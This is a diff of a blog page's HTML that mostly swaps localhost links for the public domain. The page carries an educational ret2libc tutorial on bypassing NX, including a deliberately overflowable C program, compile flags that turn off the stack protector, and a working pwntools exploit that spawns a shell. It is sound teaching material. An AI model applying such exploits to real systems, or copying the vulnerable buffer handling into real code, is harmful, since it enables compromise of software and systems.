@@ -20,18 +20,18 @@
 <meta name="keywords" content="pwn, binary, memory, x32, x64, gdb, memory corruption, binary exploitation, exploit development, ret2libc, return2libc, ret2system">
 <meta name="description" content="Stack is not allowing code execution? Let&rsquo;s bypass it">
 <meta name="author" content="Signore">
-<link rel="canonical" href="http://localhost:1313/posts/pwn-0x02-nx-bypass/">
+<link rel="canonical" href="https://signore.co.uk/posts/pwn-0x02-nx-bypass/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.f4b78c5d850152976b0e307f9d0530024c406cc77a4159ae5ea0cb4adc05fb53.css" integrity="sha256-9LeMXYUBUpdrDjB/nQUwAkxAbMd6QVmuXqDLStwF&#43;1M=" rel="preload stylesheet" as="style">
 <script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
     onload="hljs.initHighlightingOnLoad();"></script>
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://signore.co.uk/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://signore.co.uk/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://signore.co.uk/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://signore.co.uk/apple-touch-icon.png">
+<link rel="mask-icon" href="https://signore.co.uk/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/pwn-0x02-nx-bypass/">
+<link rel="alternate" hreflang="en" href="https://signore.co.uk/posts/pwn-0x02-nx-bypass/">
 <noscript>
     <style>
         #theme-toggle,
@@ -43,14 +43,14 @@
 </noscript><meta property="og:title" content="Pwn 0x02: NX Bypass" />
 <meta property="og:description" content="Stack is not allowing code execution? Let&rsquo;s bypass it" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/posts/pwn-0x02-nx-bypass/" />
-<meta property="og:image" content="http://localhost:1313/images/cover-binexp-02.png" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://signore.co.uk/posts/pwn-0x02-nx-bypass/" />
+<meta property="og:image" content="https://signore.co.uk/images/cover-binexp-02.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-08-22T00:00:00+00:00" />
 <meta property="article:modified_time" content="2022-08-22T00:00:00+00:00" /><meta property="og:site_name" content="New Horizonz" />
 
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="http://localhost:1313/images/cover-binexp-02.png" />
+<meta name="twitter:image" content="https://signore.co.uk/images/cover-binexp-02.png" />
 <meta name="twitter:title" content="Pwn 0x02: NX Bypass"/>
 <meta name="twitter:description" content="Stack is not allowing code execution? Let&rsquo;s bypass it"/>
 
@@ -64,13 +64,13 @@
       "@type": "ListItem",
       "position":  1 ,
       "name": "Posts",
-      "item": "http://localhost:1313/posts/"
+      "item": "https://signore.co.uk/posts/"
     }, 
     {
       "@type": "ListItem",
       "position":  2 ,
       "name": "Pwn 0x02: NX Bypass",
-      "item": "http://localhost:1313/posts/pwn-0x02-nx-bypass/"
+      "item": "https://signore.co.uk/posts/pwn-0x02-nx-bypass/"
     }
   ]
 }
@@ -88,7 +88,7 @@
   "articleBody": "In this post we are going to learn an exploit mitigation technique: what it is and how to bypass it.\nNew to the series? check out my previous posts here.\nNo Execute Last time, we put shellcode on the stack and called it to get code execution. In modern binaries, usually what happens is that the stack is not executable, means we can put something on the stack but it will only be considered a piece of data by the program and not some cpu instruction. This technique is called NX (No eXecute) or DEP (Data Execution Prevention).\nAlthough the data on the stack is not executable, making a function call and passing required/desired arguments is still allowed. We’re going to make use of this fact.\nWhen we are writing code for a program, we don’t write code for print and such functions. They are said to be built-ins. When we compile the program, the compiler links the program to a library (shared object) in which it would be able to find definitions of those functions during execution. Such programs are termed as Dynamically Linked which we mostly deal with, while on the contrary are Statically Linked programs which we won’t discuss right now.\nMost of the C programs - whether it’s x86 or x64 - rely on libc, the default C library.\nWe can see the shared objects (libraries) being used by a program, with the ldd command Terminal Since during the program execution, the program is making use of library functions, so the library (libc) is mapped in memory. We can abuse this by finding memory addresses and making calls to other functions present in the library as per our need. print, write, system, exit, etc are some of the functions present in the libc out of which, for now, we are most interested in system. This technique is called return2libc, ret2libc or ret2system.\nSetup Using the code from previous exercise: vulnerable.c #include #include int overflow(){ char buffer[500]; int userinput; userinput = read(0, buffer, 700); printf(\"\\nUser provided %d bytes. Buffer content is: %s\\n\", userinput, buffer); return 0; } int main(int argc, char *argv[]){ overflow(); return 0; } Compile with the command: Terminal gcc -m32 -fno-stack-protector vulnerable.c -o vulnerable Notice that we are not using the -z execstack flag anymore, which makes the stack executable.\nOur program has following protections: Terminal Before proceeding any further, remember to disable ASLR.\nExploitation We find the offset of EIP to be 516. You know how, right?\nWe want to execute system(\"/bin/sh\") for which we are going to overwrite the EIP with the address of the system function, and then we’ll give the return address which can be anything (e.g JUNK) but we will keep it to be the address of the exit function so that our program terminates nicely. Lastly, we will give the function arguments which, in present case, would be the address of the /bin/sh string. Remember stack alignment? revise here\nWith the vmmap command in gdb, we can confirm that the libc/certain sections of libc are loaded into the program Terminal Let’s get our required memory addresses with gdb: Terminal Now that we have all we needed, let’s construct our exploit: exploit.py from pwn import * exe = \"./vulnerable\" elf = context.binary = ELF(exe,checksec=False) system_addr = 0xf7dff040 exit_addr = 0xf7df1990 binsh_addr = 0xf7f46338 padding = \"A\"*516 payload = flat(padding, system_addr, exit_addr, binsh_addr) #write(\"payload\",payload) io = process(exe) io.sendline(payload) io.interactive() Let’s run the exploit: Terminal And.. Yea! we got our shell 🔥\n",
   "wordCount" : "583",
   "inLanguage": "en",
-  "image":"http://localhost:1313/images/cover-binexp-02.png","datePublished": "2022-08-22T00:00:00Z",
+  "image":"https://signore.co.uk/images/cover-binexp-02.png","datePublished": "2022-08-22T00:00:00Z",
   "dateModified": "2022-08-22T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -96,14 +96,14 @@
   },
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "http://localhost:1313/posts/pwn-0x02-nx-bypass/"
+    "@id": "https://signore.co.uk/posts/pwn-0x02-nx-bypass/"
   },
   "publisher": {
     "@type": "Organization",
     "name": "New Horizonz",
     "logo": {
       "@type": "ImageObject",
-      "url": "http://localhost:1313/favicon.ico"
+      "url": "https://signore.co.uk/favicon.ico"
     }
   }
 }
@@ -115,8 +115,8 @@
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="home (Alt + H)">
-                <img src="http://localhost:1313/apple-touch-icon-grey.png" alt="logo" aria-label="logo"
+            <a href="https://signore.co.uk/" accesskey="h" title="home (Alt + H)">
+                <img src="https://signore.co.uk/apple-touch-icon-grey.png" alt="logo" aria-label="logo"
                     height="28">home
             </a>
             <div class="logo-switches">
@@ -127,27 +127,27 @@
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/author/">
+                <a href="https://signore.co.uk/author/">
                     <span>About Me</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/archives/">
+                <a href="https://signore.co.uk/archives/">
                     <span>Archive</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/categories/">
+                <a href="https://signore.co.uk/categories/">
                     <span>Categories</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags/">
+                <a href="https://signore.co.uk/tags/">
                     <span>Tags</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" accesskey=/>
+                <a href="https://signore.co.uk/search/" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
@@ -158,7 +158,7 @@
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="https://signore.co.uk/">Home</a>&nbsp;»&nbsp;<a href="https://signore.co.uk/posts/">Posts</a></div>
     <h1 class="post-title">
       Pwn 0x02: NX Bypass
     </h1>
@@ -403,12 +403,12 @@ And.. Yea! we got our shell &#x1f525;</p>
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/pwn/">Pwn</a></li>
-      <li><a href="http://localhost:1313/tags/buffer-overflow/">Buffer Overflow</a></li>
-      <li><a href="http://localhost:1313/tags/ret2libc/">Ret2libc</a></li>
+      <li><a href="https://signore.co.uk/tags/pwn/">Pwn</a></li>
+      <li><a href="https://signore.co.uk/tags/buffer-overflow/">Buffer Overflow</a></li>
+      <li><a href="https://signore.co.uk/tags/ret2libc/">Ret2libc</a></li>
     </ul>
 <nav class="paginav">
-  <a class="next" href="http://localhost:1313/posts/ncc-ctf-2022/">
+  <a class="next" href="https://signore.co.uk/posts/ncc-ctf-2022/">
     <span class="title">Next »</span>
     <br>
     <span>NCC CTF 2022 - Rev &amp; BinExp Challenges Writeup</span>
@@ -441,7 +441,7 @@ And.. Yea! we got our shell &#x1f525;</p>
     </main>
     
 <footer class="footer">
-    <span>&copy; 2025 <a href="http://localhost:1313/">New Horizonz</a></span>
+    <span>&copy; 2025 <a href="https://signore.co.uk/">New Horizonz</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a>
